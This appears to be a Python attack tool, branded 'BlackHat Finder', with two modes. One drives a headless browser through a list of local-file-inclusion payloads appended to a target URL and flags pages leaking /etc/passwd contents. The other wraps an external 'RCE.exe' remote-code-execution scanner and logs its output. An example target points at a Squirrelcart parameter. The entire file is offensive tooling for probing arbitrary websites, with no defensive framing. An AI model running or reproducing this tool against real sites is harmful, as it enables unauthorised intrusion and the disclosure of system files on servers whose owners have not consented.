import random
import time
import sys
import subprocess
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.common.exceptions import NoSuchElementException

def LFI_Mode(url):
    cnt = 0
    print("Trying payloads list, please wait...")
    chrome_options = Options()
    chrome_options.add_argument('--headless')
    chrome_options.add_argument('--no-sandbox')
    chrome_options.add_argument('--disable-dev-shm-usage')
    browser = webdriver.Chrome(options=chrome_options)
    browser.maximize_window()
    count = 0
    vulnerable_urls = []
    with open("LFI_paths.txt", "r", encoding="UTF-8") as file:
        payloads = file.readlines()
        try:
            while count < len(payloads):
                target_url = url + payloads[count]
                browser.get(target_url)
                print("Testing: "+ payloads[count])
                time.sleep(random.randint(1, 3))
                count += 1
                if "root:x:0:0:root" in browser.page_source:
                    vulnerable_urls.append(target_url)
                    print("Vuln Url: " +target_url)
                if count == len(payloads):
                    browser.close()
        except NoSuchElementException:
            pass 

    browser.quit()
    return vulnerable_urls

import datetime

def RCE_Mode(url):
    command = ['RCE.exe', 'ws', '-url', url, 'x']
    try:
        process = subprocess.Popen(command, stdout=subprocess.PIPE, universal_newlines=True, shell=True)
        lines_written = 0
        now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(f"/Results/Result[{random.random()}].txt", "w") as f:
            f.write(f"Wrapper By @Py0x11\n------------------------------\n {now} Log Starts\n------------------------------\n")
            for _ in range(18):
                process.stdout.readline()
            for line in process.stdout:
                print(line, end='')
                sys.stdout.flush()
                if lines_written >= 18:
                    f.write(line)
                lines_written += 1
            f.write(f"\n------------------------------\n {now} Log Ends\n------------------------------\n")
    except subprocess.CalledProcessError as e:
        print(f"Error occurred: {e.output}")




def main():
    mode = input("""
▄▄▄▄· ▄▄▌   ▄▄▄·  ▄▄· ▄ •▄  ▄ .▄ ▄▄▄· ▄▄▄▄▄    ·▄▄▄▪   ▐ ▄ ·▄▄▄▄  ▄▄▄ .▄▄▄  
▐█ ▀█▪██•  ▐█ ▀█ ▐█ ▌▪█▌▄▌▪██▪▐█▐█ ▀█ •██      ▐▄▄·██ •█▌▐███▪ ██ ▀▄.▀·▀▄ █·
▐█▀▀█▄██▪  ▄█▀▀█ ██ ▄▄▐▀▀▄·██▀▐█▄█▀▀█  ▐█.▪    ██▪ ▐█·▐█▐▐▌▐█· ▐█▌▐▀▀▪▄▐▀▀▄ 
██▄▪▐█▐█▌▐▌▐█ ▪▐▌▐███▌▐█.█▌██▌▐▀▐█ ▪▐▌ ▐█▌·    ██▌.▐█▌██▐█▌██. ██ ▐█▄▄▌▐█•█▌
·▀▀▀▀ .▀▀▀  ▀  ▀ ·▀▀▀ ·▀  ▀▀▀▀ · ▀  ▀  ▀▀▀     ▀▀▀ ▀▀▀▀▀ █▪▀▀▀▀▀•  ▀▀▀ .▀  ▀         
                                                                By @pcstat
        Choose Mode :
                 1.LFI Mode
                 2.RCE Finder[Vuln Scanner]

                                     Choose : >> """)
    if mode == "1":
        target_url = input("Example Url : http://example.com/squirrelcart/cart_content.php?cart_isp_root=\nPlease enter the target URL: ")
        vulnerable_urls = LFI_Mode(target_url)
        if vulnerable_urls:
            print("LFI Vulnerability Found!")
            print("Vulnerable URLs:")
            for url in vulnerable_urls:
                print(url)
        else:
            print("No LFI Vulnerability Found.")
    elif mode == "2":
        target_url = input("Please enter the target URL: ")
        RCE_Mode(target_url)
    else:
        print("Invalid mode selection.")

if __name__ == "__main__":
    main()
